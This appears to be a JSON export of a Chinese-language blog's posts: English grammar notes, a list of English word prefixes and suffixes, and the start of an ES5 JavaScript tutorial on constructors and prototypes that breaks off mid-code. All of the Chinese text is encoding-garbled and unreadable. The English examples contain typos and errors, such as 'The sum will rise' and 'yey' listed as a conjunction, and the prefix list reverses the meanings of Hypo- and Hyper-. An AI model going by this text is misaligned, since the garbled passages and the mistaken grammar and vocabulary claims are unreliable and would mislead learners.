åƒè€ƒè³‡æ–™å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆåŠç‰©å‹•è©ï¼‰å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆä¸åŠç‰©å‹•è©ï¼‰ å°ç­‰é€£æ¥è© é€£çµè©é€£æ¥çš„å…©ç«¯å¿…é ˆå°ç­‰ï¼ˆå­—å’Œå­—ã€ç‰‡èªå’Œç‰‡èªã€å¥å­å’Œå¥å­ï¼‰ and but or nor for so yey Edward is kind and courageous.ï¼ˆå½¢å®¹è©ï¼‰She is a loving mother and a loyal friend.ï¼ˆç‰‡èªï¼‰Betty lived life fully and completely.ï¼ˆå‰¯è©ï¼‰ å‹•åè© / åŸå½¢å‹•è©æ”¾åœ¨å¥é¦–å‹•åè©æ”¾å¥é¦–ç•¶ä½œã€Œä¸»è©ã€Drinking enought water every day is very important.æ¯å¤©å–è¶³å¤ çš„æ°´æ˜¯éå¸¸é‡è¦çš„ã€‚ Drinking enought water every day is very important ä¸»è© æ™‚é–“å‰¯è© å‹•è© è£œèª åŸå½¢å‹•è©æ”¾å¥é¦–ç•¶ä½œã€Œç¥ˆä½¿å¥ã€Take an unbrella with you. It seems as if itâ€™s going to rain.å¸¶æŠŠé›¨å‚˜å§ï¼Œçœ‹èµ·ä¾†å¥½åƒè¦ä¸‹é›¨äº†ã€‚ Take an unbrella with you It seems as if itâ€™s going to rain. å‹•è© ä¸»è© é€£ç¶´å‹•è© é€£æ¥è© ç¨ç«‹å­å¥ åƒè€ƒè³‡æ–™ã€è€å¸«æ•‘æ•‘æˆ‘ã€‘ç‚ºä»€éº¼å¥å­çš„é–‹é ­æ˜¯åŸå½¢å‹•è©ï¼Ÿ é—œæ–¼é•·å¥æ‡¶äººåŒ… åˆå¥ï¼ˆç¨ç«‹å­å¥ + ç¨ç«‹å­å¥ï¼‰ è¤‡å¥ï¼ˆç¨ç«‹å­å¥ + å¾å±¬å­å¥ï¼‰ è¤‡åˆå¥ï¼ˆç¨ç«‹å­å¥ + ç¨ç«‹å­å¥ + å¾å±¬å­å¥ï¼‰ ä¾‹å­ï¼š I drink plenty of fruit juice, I get a plenty of sleep.æˆ‘å–äº†ä¸€å †æœæ±ï¼Œæˆ‘ç²å¾—å……è¶³çš„ç¡çœ ã€‚ç¨ç«‹å­å¥â€I drink plenty of fruit juiceâ€èˆ‡ç¨ç«‹å­å¥â€I get a plenty of sleep.â€ Even though I feel like crying, å„˜ç®¡æˆ‘æœ‰æƒ³å“­çš„æ„Ÿè¦ºï¼Œæˆ‘ä»ç”¨ç¬‘å®¹ä¾†æ©é£¾ä¸€åˆ‡ã€‚å¾å±¬å­å¥â€Even though I feel like cryingâ€èˆ‡ç¨ç«‹å­å¥â€I hide it with a smile.â€ You can sign your kids up for piano lessons, but if they are forced to do it, they wonâ€™t practice much.ä½ å¯ä»¥å¹«ä½ çš„å°å­©å ±åé‹¼ç´èª²ï¼Œä½†å¦‚æœä»–å€‘æ˜¯è¢«å¼·è¿«åƒåŠ çš„ï¼Œå®ƒå€‘å°±ä¸æœƒå¤šç·´ç¿’ã€‚ç¨ç«‹å­å¥â€You can sign your kids up for piano lessonsâ€èˆ‡è¤‡å¥â€if they are forced to do it, they wonâ€™t practice muchâ€ ç¶“ç”±å°ç­‰é€£æ¥è© but é€£çµï¼Œå½¢æˆè¤‡åˆå¥ã€‚ è¤‡å¥å¿…é ˆä½¿ç”¨ä»¥ä¸‹å…©ç¨®é€£æ¥è©ä¾†é€£æ¥ä¸€å€‹å¾å±¬å­å¥ å¾å±¬é€£æ¥è©ï¼ˆå‰å¾Œå¥å­æœ‰çµ•å°é—œä¿‚ï¼‰ becauseã€sinceã€afterã€althoughã€when é—œä¿‚ä»£åè©ï¼ˆä¸»è¦åœ¨å½¢å®¹å‰é¢çš„ä¸»è©ï¼‰thatã€whoã€whichã€whoeverã€whichever é—œæ–¼å­å¥ ç¨ç«‹å­å¥ å¾å±¬å­å¥ ç¨ç«‹å­å¥æ„æ€å®Œæ•´ï¼Œå¯ä»¥å–®ç¨å­˜åœ¨ã€‚ I am coding.æˆ‘æ­£åœ¨æ‰“ç¢¼ã€‚ She is playing a game.å¥¹æ­£åœ¨ç©éŠæˆ²ã€‚ The boss is debugging.è€é—†æ­£åœ¨é™¤éŒ¯ã€‚ å¾å±¬å­å¥æ„æ€ä¸å®Œæ•´ï¼Œä¸èƒ½å–®ç¨å­˜åœ¨ï¼Œéœ€è¦å¦å¤–ä¸€å€‹ç¨ç«‹å­å¥ä¾†è®“å¥å­å®Œæ•´ã€‚ While I was debugging.ç•¶æˆ‘æ­£åœ¨é™¤éŒ¯çš„æ™‚å¾Œã€‚ Because you miss a â€œwhite-speaceâ€.å› ç‚ºä½ æ¼äº†ä¸€å€‹â€ç©ºç™½å­—å…ƒâ€ã€‚ Although she has finished the feature.å„˜ç®¡å¥¹å®Œæˆäº†é€™é …åŠŸèƒ½ã€‚ åƒè€ƒè³‡æ–™ã€ä½ çš„å¥å­æœ‰å¹¾å€‹å­—ã€‘æ‹‰é•·å¥å­çš„å¦™æ–¹ï¼šå­å¥ will èˆ‡ be going to å·®ç•°åšæ±ºå®šçš„æ™‚æ©Ÿwill â†’ è¬›è©±çš„ç•¶ä¸‹æ‰æ±ºå®š be going to â†’ æ—©å°±å·²ç¶“æ±ºå®š æ™‚é–“çš„é•·åº¦will â†’ é•·é çš„æœªä¾† be going to â†’ çŸ­æœŸçš„æœªä¾† å°æœªä¾†çš„é æ¸¬will â†’ åå‘çŒœæ¸¬ã€æ„è¦‹ be going to â†’ å¾ç¾å¯¦æ¨å°å‡ºæ¯”è¼ƒæœ‰æ ¹æ“šã€æœ‰æŠŠæ¡çš„æœªä¾† æ‰¿è«¾ã€å¹«å¿™ç”¨ willIâ€™m going to Singapore on business this weekend. Will you help me look after my dog?é€™å€‹å‘¨æœ«æˆ‘è¦å»æ–°åŠ å¡å‡ºå·®ï¼Œä½ å¯ä»¥å¹«æˆ‘ç…§é¡§æˆ‘çš„ç‹—å—ï¼Ÿ No problem. I will help you.æ²’å•é¡Œï¼Œæˆ‘æœƒå¹«ä½ ç…§é¡§å¥¹ å¦‚æœè®Šæˆâ€¦No problem. Iâ€™m going to help you.æ²’å•é¡Œï¼Œæˆ‘æ­£è¦å»å¹«å¿™ä½  æœªä¾†çš„äº‹å¯¦ç”¨ willThe sum will rise tomorrow.å¤ªé™½æ˜å¤©ä¾èˆŠæœƒå‡èµ· å¦‚æœè®Šæˆâ€¦The sum is going to rise tomorrow.å¤ªé™½æ˜å¤©æ­£è¦å‡èµ·ï¼ˆä»£è¡¨æœ‰æ™‚å¤ªé™½ä¸æœƒå‡èµ·ä¸€æ¨£ï¼‰ åƒè€ƒè³‡æ–™ã€æ˜“æ··æ·†ã€‘åˆ¥å†æ··ç”¨äº†ï¼will-è·Ÿ-going-å…¶å¯¦ä¸ä¸€æ¨£ï¼ either çš„å„ç¨®ç”¨æ³•either ã€Œä¹Ÿã€ï¼ˆå¦å®šï¼‰ ç•¶ä½œ adv ä½¿ç”¨ éœ€ä»¥ and é€£æ¥ æ”¾åœ¨å¥å°¾ï¼ˆé€—è™Ÿå¾Œæ–¹çš„å¥å­ï¼‰ She canâ€™t speak English well, and I canâ€™t either.ä»–çš„è‹±æ–‡ä¸å¤ªæµåˆ©ï¼Œæˆ‘ä¹Ÿä¸€æ¨£ã€‚ either ã€Œå…©è€…ä¹‹ä¸­ä»»ä½•ä¸€å€‹ã€ ç•¶ä½œ ä»£åè© ä½¿ç”¨ï¼ˆä»£è·Ÿåœ¨å¾Œé¢çš„é‚£å€‹åè©ï¼‰ è‹¥åè©å‰æœ‰ æ‰€æœ‰æ ¼ï¼ˆThe, These, Thoseï¼‰ï¼Œeither éœ€åœ¨åŠ ä¸Š of either æœ¬èº«è¦–ç‚ºå–®æ•¸ï¼Œæ•…å‹•è©è¦æ³¨æ„å‹æ…‹ Either of us needs to wash the dishes.æˆ‘å€‘ä¹‹ä¸­æœ‰äººå¾—å»æ´—ç¢—ã€‚ either ã€Œå…©è€…ä¹‹ä¸­ä»»ä½•ä¸€å€‹; å…©è€…çš„ã€ ç•¶ä½œ é™å®šè© ä½¿ç”¨ å¾Œé¢çš„åè©é ˆç‚º å–®æ•¸å¯æ•¸ You can take either road, both roads will lead you to my house.å…©æ¢è·¯ä½ éƒ½å¯ä»¥èµ°ï¼Œéƒ½æœƒé€šåˆ°æˆ‘å®¶ã€‚ I once studied German and Spanish, but Iâ€™ve forgotten either one.æˆ‘å­¸éå¾·æ–‡èˆ‡è¥¿ç­ç‰™æ–‡ï¼Œä½†æˆ‘å·²ç¶“å¿˜å…‰å…‰äº†ã€‚ either A or B ã€Œä¸æ˜¯ A å°±æ˜¯ Bã€ ç•¶ä½œ å°ç­‰é€£æ¥è© ä½¿ç”¨ é€šå¸¸å’Œ or ä¸€èµ·ä½¿ç”¨ We will meet each other either this week or next week.æˆ‘å€‘ä¸æ˜¯é€™ç¦®æ‹œå°±æ˜¯ä¸‹ç¦®æ‹œè¦‹é¢ã€‚ Sheâ€™s not going to marry either Tom or Jerry.ä»–ä¸æœƒè·Ÿ Tom æˆ– Jerry çµå©š Either we leave for Jennyâ€™s house now or we may miss the party.æˆ‘å€‘è¦ä¸å°±ç¾åœ¨å‡ºç™¼å» Jenny å®¶ï¼Œè¦ä¸å°±æ˜¯éŒ¯éæ´¾å°ã€‚ åƒè€ƒè³‡æ–™ã€Œeitherã€å’Œã€Œneitherã€æ­£ç¢ºç”¨æ³•æ˜¯ï¼Ÿä¾†çœ‹ä¾‹å¥ææ‡‚ï¼ made of èˆ‡ made fromas çš„å„ç¨®ç”¨æ³•as long as åªè¦â€¦ as long as A, Bâ€¦ å¦‚æœ A äº‹ä»¶ç™¼ç”Ÿäº†ï¼Œé‚£éº¼ B äº‹ä»¶å°±èƒ½å¤ å¯¦ç¾ å¯ä»£æ›æˆ so long as ç•¶ä½œé€£æ¥è©ä½¿ç”¨ï¼Œå¯ä»¥æ”¾å¥é¦– / å¥ä¸­ã€‚ You can go out as long as you finish your homewrok.åªè¦ä½ åšå®Œä½œæ¥­å°±å¯ä»¥å‡ºé–€äº† As long as you love me, I donâ€™t care how much money you have.åªè¦ä½ æ„›æˆ‘ï¼Œæˆ‘ä¸åœ¨ä¹ä½ æœ‰å¤šå°‘éŒ¢ As long as I have you, nothing else is matters.åªè¦æˆ‘æ“æœ‰ä½ ï¼Œé‚£ä»€éº¼äº‹éƒ½ä¸é‡è¦äº† As long as the weather is good next weekend, we will go hiking.åªè¦ä¸‹å€‹å‘¨æœ«å¤©æ°£å¥½ï¼Œæˆ‘å€‘å°±æœƒå»å¥è¡Œã€‚ as soon as ä¸€â€¦å°± as soon as A, B A ç™¼ç”Ÿå¾Œï¼Œæ¥è‘— B é¦¬ä¸Šè·Ÿè‘—ç™¼ç”Ÿ ç•¶ä½œé€£æ¥è©ä½¿ç”¨ï¼Œå¯ä»¥æ”¾å¥é¦– / å¥ä¸­ã€‚ The baby stopped crying as soon as she saw her mother.é‚£å€‹å°å¬°å…’ä¸€è¦‹åˆ°åª½åª½ä¹‹å¾Œå°±ä¸å“­äº†ã€‚ Damn it! As soon as I walked out of my house, it started to rain.è©²æ­»ï¼æˆ‘ä¸€è¸å‡ºå®¶é–€ï¼Œå°±é–‹å§‹ä¸‹é›¨äº† As soon as Jennifer graduated from high school, her family moved to California.Jennifer ä¸€å¾é«˜ä¸­ç•¢æ¥­ï¼Œä»–å€‘å…¨å®¶å°±æ¬å»äº†åŠ å·ã€‚ The meeting will begin as soon as the boss shows up.è€é—†ä¸€å‡ºç¾ï¼Œé€™å ´æœƒè­°å°±æœƒé–‹å§‹äº†ã€‚ as far asas far as æåˆ°ã€è«‡åˆ°ï¼ˆæŸäººæŸç‰©ï¼‰ æ¥åè© / å‹•åè© As far as my resumeè«‡åˆ°æˆ‘çš„å±¥æ­· As far as performing poohæåˆ°è¡¨æ¼”å°ç†Šç¶­å°¼ as far as é”åˆ°â€¦çš„ç¨‹åº¦; é”åˆ°â€¦çš„è·é›¢ï¼ˆåœ°é»ï¼‰ å¾Œé¢æ¥åè© Iâ€™ve read as far as the fifth chapter, but I still need to read three more chapters.æˆ‘å·²ç¶“è®€åˆ°ç¬¬å››ç« äº†ï¼Œä½†æˆ‘é‚„æœ‰ä¸‰å€‹ç« ç¯€å¾—è®€ã€‚ After you reach the summit, I suggest you go as far as the old castle. Itâ€™s worth visiting.ä½ æ”»é ‚ä¹‹å¾Œï¼Œæˆ‘å»ºè­°ä½ å†èµ°é ä¸€é»åˆ°å¤å ¡é‚£ï¼Œé‚£è£å¾ˆå€¼å¾—ä¸€è¨ªã€‚ as far as (someting) is concerned é—œæ–¼æŸäº‹ç‰©As far as the budget is concerned, the company decided to sponsor our event.é—œæ–¼é ç®—çš„éƒ¨åˆ†ï¼Œé‚£å®¶å…¬å¸æ±ºå®šè´ŠåŠ©æˆ‘å€‘çš„æ´»å‹•äº† As far as speaking English is concerned, Ruby is doing pretty well. However, she should improve her writting.åœ¨è‹±æ–‡å£èªªæ–¹é¢ï¼ŒRuby åšå¾—å¾ˆå¥½ï¼Œä¸éï¼Œä»–æ‡‰è©²è¦æ”¹å–„å¯«ä½œèƒ½åŠ›ã€‚ åƒè€ƒè³‡æ–™ã€Œasã€æ­£ç¢ºç”¨æ³•æ˜¯ï¼Ÿä¾†ææ‡‚ as çš„ 6 å¤§ç”¨æ³•ï¼ï¼ˆå«ä¾‹å¥ï¼‰ as ifå½·å½¿çš„æ„æ€ã€‚ åƒè€ƒè³‡æ–™è‹±æ–‡ As If ç”¨æ³•(Usage Of As If In English) since çš„å„ç¨®ç”¨æ³•è‡ªå¾ ç•¶ä½œå¾å±¬é€£æ¥è© å¯ä»¥æ¥ä¸€å€‹æ™‚é–“é» å¯ä»¥æ¥ä¸€å€‹å®Œæ•´çš„å¥å­ å¾éå»æŸå€‹æ™‚é–“é–‹å§‹ï¼Œå°±ä¸€ç›´æŒçºŒè‘—ã€‚ I have lived in Taiwan since last year.æˆ‘å¾å»å¹´é–‹å§‹ä½åœ¨å°ç£ã€‚ I have learned to code since I was a child.åœ¨æˆ‘é‚„å°çš„æ™‚å€™ï¼Œæˆ‘å°±å·²ç¶“åœ¨å­¸ç¿’æ‰“ç¢¼äº†ã€‚ æ—¢ç„¶ã€å› ç‚º ç•¶ä½œå¾å±¬é€£æ¥è© è·Ÿ beacuse çš„ç”¨æ³•ä¸åŒï¼Œsince ä»£è¡¨çš„æ˜¯ã€Œé¡¯è€Œæ˜“è¦‹ã€å¤§å®¶éƒ½çŸ¥é“çš„æƒ…æ³ã€ã€‚ Since you canâ€™t answer my question, I will ask someone else.æ—¢ç„¶ä½ æ²’è¾¦æ³•å›ç­”æˆ‘çš„å•é¡Œï¼Œæˆ‘æœƒå»å•åˆ¥äººã€‚ Since we have sometime, we can walk around and take some pictures.æ—¢ç„¶æˆ‘å€‘é‚„æœ‰ä¸€é»æ™‚é–“ï¼Œæˆ‘å€‘å¯ä»¥å»é™„è¿‘èµ°èµ°ã€æ‹äº›ç…§ç‰‡ã€‚ å¾æ­¤ã€æ­¤å¾Œ ç•¶ä½œå‰¯è©ä½¿ç”¨ï¼Œé€šå¸¸æ”¾å¥å°¾ She left last night and I havenâ€™t seen her since.ä»–æ˜¨æ™šé›¢é–‹å¾Œï¼Œæˆ‘å¾æ­¤å°±å†ä¹Ÿæ²’è¦‹éå¥¹ã€‚ Her son died two years ago and he has rarely spoken to people since.å¥¹çš„å…’å­å…©å¹´å‰å»ä¸–äº†ï¼Œå¾æ­¤ä»¥å¾Œå¥¹å°±å¾ˆå°‘è·Ÿäººèªªè©±ã€‚ ever since å¾é‚£ä¹‹å¾Œ ç•¶ä½œå¾å±¬é€£æ¥è©ï¼Œä½†èªæ°£æ¯” since æ›´å¼·èª¿ã€‚ Ever since I was a student, I have wanted to write scripts.å¾æˆ‘é‚„æ˜¯å­¸ç”Ÿæ™‚ï¼Œæˆ‘å°±ä¸€ç›´æƒ³å¯«åŠ‡æœ¬ã€‚ Jim has worked for his company ever since he graduated from colledge.Jim ç•¢æ¥­å¾Œå°±ä¸€ç›´åœ¨é€™é–“å…¬å¸å·¥ä½œã€‚ long since æ—©å°± ç•¶ä½œå‰¯è©ï¼Œé€šå¸¸æ”¾å‹•è©å‰ä¾†ä¿®é£¾å‹•è©ã€‚ I have long since forgiven him for what he did.æˆ‘æ—©å°±å·²ç¶“åŸè«’ä»–çš„æ‰€ä½œæ‰€ç‚ºã€‚ since when å¾ä»€éº¼æ™‚å€™é–‹å§‹ ç•¶ä½œå‰¯è©ä½¿ç”¨ æœ‰æ†¤æ€’ã€è³ªå•ã€ä¿®å¹¹çš„èªæ°£ Since when do you really care about me?å¾ä»€éº¼æ™‚å€™é–‹å§‹ï¼Œä½ é–‹å§‹åœ¨ä¹æˆ‘äº†ï¼Ÿ Since when have you become so radical?å¾ä»€éº¼æ™‚å€™é–‹å§‹ï¼Œä½ è®Šå¾—å¦‚æ­¤åæ¿€ï¼Ÿ Consider çš„ç”¨æ³•consider + N. è€ƒæ…®æŸé …äº‹ç‰© We should consider his age.æˆ‘å€‘æ‡‰è©²è€ƒæ…®ä»–çš„å¹´ç´€ã€‚ Please consider our proposal.è«‹è€ƒæ…®æˆ‘å€‘çš„ææ¡ˆã€‚ consider + Ving è€ƒæ…®åšæŸä»¶äº‹ She was considering visiting her frirends in italy.å¥¹ç•¶æ™‚æ­£åœ¨è€ƒæ…®å»è¦‹å¥¹åœ¨ç¾©å¤§åˆ©çš„æœ‹å‹ã€‚ Iâ€™ve never considered quitting my job.æˆ‘å¾ä¾†æ²’æœ‰è€ƒæ…®è¾­è·ã€‚ consider + O. + (to be) â€¦ æŠŠâ€¦ç•¶ä½œã€èªç‚ºâ€¦æ˜¯ã€æŠŠâ€¦è¦–ç‚º She considers him to be her Mr. Right.å¥¹æŠŠä»–ç•¶ä½œæ˜¯å¥¹çš„çœŸå‘½å¤©å­ã€‚ I consider the Netherlands to be one of my favorite contries.æˆ‘èªç‚ºå°¼çˆ¾è˜­ç•¶ä½œæ˜¯æˆ‘æœ€å–œæ­¡çš„åœ‹å®¶ä¹‹ä¸€ã€‚ Mary considers herself fortunate.Mary èªç‚ºå¥¹è‡ªå·±å¾ˆå¹¸é‹ã€‚ be V. + considered + to be / to do è¢«èªç‚ºæ˜¯ï¼ˆè¢«å‹•èªæ…‹ï¼‰ Einstein is considered to be a genius.æ„›å› æ–¯å¦è¢«èªç‚ºæ˜¯å¤©æ‰ã€‚ Anne Hathaway is considered to have beautiful eyes.Anne Hathaway è¢«èªç‚ºæ“æœ‰ç¾éº—çš„é›™çœ¼ã€‚ consider + N + as æœ‰çˆ­è­°æ€§ï¼ˆå¯ä»¥æ”¹ç”¨ regard ä¾†ä»£æ›¿ / æˆ–çœç•¥ asï¼‰ è¦–â€¦ç‚º as å¯çœç•¥ They should consider this as a long-term plan.= They should consider this a long-term plan.ä»–å€‘æ‡‰è©²è¦æŠŠé€™å€‹è¦–ç‚ºä¸€å€‹é•·æœŸçš„è¨ˆç•«ã€‚ I consider him as my best friend.= I consider him my best friend.æˆ‘æŠŠå¥¹è¦–ç‚ºæˆ‘æœ€å¥½çš„æœ‹å‹ consider wh- + to do + å­å¥ æ¥ who, what, how ç­‰ç­‰ è€ƒæ…®â€¦ Have you consider where to go next?ä½ æœ‰è€ƒæ…®æ¥ä¸‹ä¾†è¦å»å“ªè£¡äº†å—ï¼Ÿ He is considering how to deal with the problem.ä»–æ­£åœ¨è€ƒæ…®è¦å¦‚ä½•è§£æ±ºé€™å€‹å•é¡Œã€‚ They are considering what they will do tomorrow.ä»–å€‘æ­£åœ¨è€ƒæ…®æ˜å¤©è¦åšä»€éº¼ã€‚ consider (that) è€ƒæ…®åˆ°â€¦ I hadnâ€™t even consider that she might not want go to the party.æˆ‘éƒ½é‚„æ²’è€ƒæ…®åˆ°å¥¹å¯èƒ½ä¸æœƒæƒ³å»æ´¾å°ã€‚ You have to consider that he just moved to a new country.ä½ æ‡‰è©²è¦è€ƒæ…®åˆ°ä»–æ‰å‰›æ¬åˆ°ä¸€å€‹æ–°çš„åœ‹å®¶ã€‚ all things consider ç¸½é«”ä¾†èªªã€è€ƒæ…®åˆ°æ‰€æœ‰çš„å› ç´  All things consider, it was a great party.ç¸½é«”ä¾†èªªï¼Œé€™æ˜¯ä¸€å ´å¾ˆæ£’çš„æ´¾å°ã€‚ All things consider, Iâ€™d rather be in Taiwan.è€ƒæ…®åˆ°æ‰€æœ‰çš„å› ç´ ï¼Œæˆ‘å¯§é¡˜ç•™åœ¨å°ç£ã€‚ considering è¡¨ç¤ºã€Œè€ƒæ…®ã€ é¡ä¼¼ regarding çš„ä»‹ä¿‚è©ç”¨æ³• æ¥åè© Considering her age, sheâ€™s quite outgoing.è€ƒæ…®åˆ°ä»–çš„å¹´ç´€ï¼Œä»–é‚„è »å¤–å‘çš„ã€‚ He did quite well on his exam considering the circumstances.è€ƒæ…®åˆ°é€™äº›æƒ…æ³ï¼Œä»–åœ¨è€ƒè©¦ä¸Šçš„è¡¨ç¾å¾ˆä¸è³´ã€‚ considering that è¡¨ç¤ºã€Œè€ƒæ…®åˆ°â€¦ã€ æ­¤è™•ä½œç‚ºè¤‡åˆé€£æ¥è©ï¼Œæ‰€ä»¥å¾Œé¢è¦æ¥ã€Œå¥å­ã€ï¼ˆåˆ¥è·Ÿ considering + N.ææ··ï¼‰ that å¯çœç•¥ Considering (that) heâ€™s only just started learning English, he speaks the language quite well.è€ƒæ…®åˆ°ä»–æ‰å‰›é–‹å§‹å­¸è‹±æ–‡ï¼Œä»–çš„è‹±æ–‡èªªçš„å¾ˆä¸è³´ã€‚ I was immpressed that Ammy could found the way here, considering (that) sheâ€™d only been here once before.è‰¾å’ªèƒ½å¤ æ‰¾åˆ°é€™è£¡è®“è®“æˆ‘å¾ˆå°è±¡æ·±åˆ»ï¼Œè€ƒæ…®åˆ°ä»–ä¹‹å‰åªä¾†éé€™è£¡ä¸€æ¬¡ã€‚ Iâ€™ve always consider you as a friend. åƒè€ƒè³‡æ–™ã€Œconsiderã€æ­£ç¢ºç”¨æ³•æ˜¯ï¼Ÿä¾†çœ‹ä¾‹å¥ææ‡‚ï¼ If I were â€¦ å¦‚æœæˆ‘â€¦ä»£è¡¨ã€Œå‡è¨­èªæ°£ã€ï¼Œå‡è¨­èªæ°£çš„è©±å°±è¦å¾ã€ŒI wasã€ â†’ ã€ŒI wereã€ Rather thanæ˜¯ Aâ€¦è€Œä¸æ˜¯ Bï¼ˆç•¶é€£æ¥è©æ™‚ï¼‰å› ç‚ºæ˜¯ä½œç‚ºé€£æ¥è©ä½¿ç”¨ï¼Œæ‰€ä»¥ A è·Ÿ B çš„è©æ€§éœ€ç›¸ç­‰ For exercise, I walk rather than run.ï¼ˆéƒ½æ˜¯ v.ï¼‰ä»¥é‹å‹•ä¾†èªªï¼Œæˆ‘æ˜¯èµ°è·¯è€Œä¸æ˜¯è·‘æ­¥ã€‚ I decided to drink coffee rather than soda.ï¼ˆéƒ½æ˜¯ n.ï¼‰æˆ‘é¸æ“‡å–å’–å•¡è€Œä¸æ˜¯æ±½æ°´ã€‚ I would describe wanting as cut rather than hot.ï¼ˆéƒ½æ˜¯ adj.ï¼‰æˆ‘æœƒå½¢å®¹ wanting æ˜¯å¯æ„›è€Œä¸æ˜¯ç«è¾£ã€‚ He talks slowly rather than quicklyï¼ˆéƒ½æ˜¯ adv.ï¼‰å®ƒè¬›è©±æ˜¯å¾ˆæ…¢è€Œä¸æ˜¯å¾ˆå¿«ã€‚ ä¸æ˜¯ Aâ€¦è€Œæ˜¯ Bï¼ˆæ”¾å¥é¦–æ™‚ï¼‰å¦‚æœæ˜¯æ¥å‹•è©ï¼ŒåŸå‹å‹•è©(v)æœƒæ¯”å‹•åè©(Ving)ä¾†å¾—å¸¸è¦‹ Rather than ride a bicycle, she walk to work.å¥¹ä¸æ˜¯é¨è…³è¸è»Šè€Œæ˜¯èµ°è·¯å»ä¸Šç­ Rather than watch videos, I read books.æˆ‘æ²’æœ‰çœ‹å½±ç‰‡ï¼Œè€Œæ˜¯è®€æ›¸ã€‚ Rather than stay at home, she went out for a walk.å¥¹æ²’æœ‰å¾…åœ¨å®¶ï¼Œè€Œæ˜¯å‡ºå»æ•£æ­¥äº†ã€‚ æ­é…ç”¨æ³• Would ratherâ€¦thanâ€¦ è¡¨ç¤ºå¯§å¯â€¦ä¹Ÿä¸é¡˜â€¦ åªèƒ½æ¥æ–¼åŸå‹å‹•è© å‰å¾Œå¿…é ˆå°ç­‰ She would rather dance than sing in public.å¥¹å¯§å¯åœ¨å…¬å…±å ´åˆå‰è·³èˆä¹Ÿä¸è¦å”±æ­Œã€‚ He would rather kiss Jane than hug Sandy.å¥¹å¯§å¯è¦ª Jane ä¹Ÿä¸è¦æŠ± Sandyã€‚ åƒè€ƒè³‡æ–™ã€Œrather thanã€æ­£ç¢ºç”¨æ³•æ˜¯ï¼Ÿä¾†çœ‹ä¾‹å¥ææ‡‚ï¼","link":"/2021/07/18/english-note/"},{"title":"å–®å­—ä¸­çš„å­—æ ¹é¦–å°¾","text":"æŠŠä»¥å‰åšçš„ç­†è¨˜æ¬ä¾†é€™è£¡ã€‚ å½¢å®¹è©å­—å°¾ -ive sensitiveã€exclusive -ic romantic -ent confidentã€differentã€dependent -ly lovelyã€friendly -ty safetyã€loyalty -ous seriousã€dangerousã€variousã€famousã€delicious -al logicalã€horizontalã€literalã€globalã€denial åè©å­—å°¾ -or actorã€doctor -ion situationã€function -ian indianã€muscian -ure natureã€pleasureã€culture -ment announcementã€enviormentã€equipmentã€detachment -ance distanceã€balanceã€instanceã€enhance -ence sequenceã€conferenceã€differenceã€experience -ness businessã€kindnessã€weakness -cy transparencyã€policy å‰¯è©å­—å°¾ -ly suddenlyã€easilyã€slowly å‹•è©å­—å°¾ -ize apologizeã€recognizeã€initalizeã€optimize -ate createã€motivate -fy modifyã€satisfyã€simplify å­—æ ¹ En- ä½¿æˆç‚ºã€æ”¾å…¥ Un- ä¸ Con- å…±åŒã€ä¸€èµ· Pri- Prim- Prin ç¬¬ä¸€çš„ Fore- å‰é¢çš„ Hypo- ä¸Šé¢çš„ã€è¶…è¶Š Hyper ä¸‹é¢çš„ã€ä½çš„ hypotentionï¼ˆä½è¡€å£“ï¼‰ Que- å°‹æ‰¾ã€è©¢å•","link":"/2021/12/23/english-trick/"},{"title":"ES5 å¯¦ä½œç‰©ä»¶å°å‘","text":"ä»¥å‰å­¸çš„åšæ³•ã€‚ ç°¡è¿°æˆ‘å€‘å…ˆä¾†çœ‹çµæœæœƒé•·ä»€éº¼æ¨£ï¼Œç­‰ç­‰å†ä¾†è§£é‡‹ï¼š 123456789101112131415function Person(name) { this._name = name}Person.prototype.getName = function () { console.log(this._name)}Person.prototype.setName = function (newName) { this._name = newName}const person1 = new Person('PeaNu')const person2 = new Person('PPB')person1.getName() // PeaNuperson2.getName() // PPB é †ä¾¿å¹«ä½ è¤‡ç¿’ä¸€ä¸‹ ES6 çš„å¯«æ³•ï¼Œåšå€‹å°ç…§ï¼š 1234567891011121314151617class Person { constructor(name) { this._name = name } getName() { console.log(this._name) } setName(newName) { this._name = newName }}const person1 = new Person('PeaNu')const person2 = new Person('PPB')person1.getName() // PeaNuperson2.getName() // PPB é—œæ–¼ constructorå¯ä»¥ç™¼ç¾ ES5 å¯«èµ·ä¾†æ²’æœ‰é‚£éº¼ç›´è¦ºï¼Œåœ¨æ²’æœ‰ class æ™‚åªèƒ½æŠŠ function ç•¶ä½œ constructor ä¾†ç”¨ï¼Œè€Œä¸”é‚„è¹¦å‡ºä¸€å † prototype çš„æ±è¥¿ã€‚ å¦å¤–ç‚ºäº†é¿å…è·Ÿæ™®é€šçš„ function ææ··ï¼Œä¸€èˆ¬æœƒåƒ class ä¸€æ¨£ç”¨ã€Œå¤§å¯«é–‹é ­ã€ä¾†å€åˆ†ã€‚å†ä¾†æ˜¯å¾ˆé‡è¦çš„ä¸€é»ï¼Œå°±æ˜¯ constructor ä¸€å®šè¦æ­é… new ä¾†ä½¿ç”¨ï¼Œä¸ç„¶æœƒæ²’æœ‰ä½œç”¨ã€‚ æ‰€ä»¥èªªåªè¦ä½ çœ‹åˆ° new xxx() çš„è©±ä¸€å®šä»£è¡¨æ˜¯ call æŸå€‹ constructorï¼Œè€Œä¸æ˜¯ functionã€‚ prototype å¹¹å˜›ç”¨çš„ï¼Ÿä»¥å‰æˆ‘å°è®Šæ•¸çš„æ¦‚å¿µä¸ç†Ÿï¼Œæ‰€ä»¥ä¸€ç›´ä¸æ‡‚ prototype çš„å¯¦éš›æ„ç¾©æ˜¯ä»€éº¼ã€‚ä½†ç¾åœ¨ç†Ÿäº†ä»¥å¾Œå°±å¾ˆæ¸…æ¥šäº†ã€‚ ä½ å…ˆæƒ³æƒ³çœ‹ï¼Œå¦‚æœä¸ç”¨ prototype çš„è©±æœƒæ€æ¨£ï¼Ÿ 123456789101112function Person(name) { this._name = name this.getName = function () { console.log(this._name) } this.setName = function (newName) { this._name = newName }}const person1 = new Person('PeaNu')const person2 = new Person('PPB') çœ‹èµ·ä¾†å¥½åƒæ²’ä»€éº¼å·®ï¼Ÿä½†å¦‚æœåŸ·è¡Œé€™æ®µçš„è©±æœƒç™¼ç¾ï¼š 1console.log(person1.getName === person2.getName) // false çµæœæ˜¯ falseï¼Œä»£è¡¨é€™å…©å€‹ getName æ˜¯å…©å€‹ä¸åŒçš„ functionã€‚ä¸å¤ªæ‡‚çš„è©±å†èˆ‰å€‹ä¾‹å­ï¼š 123456789101112131415function getName1() { console.log('hi')}function getName2() { 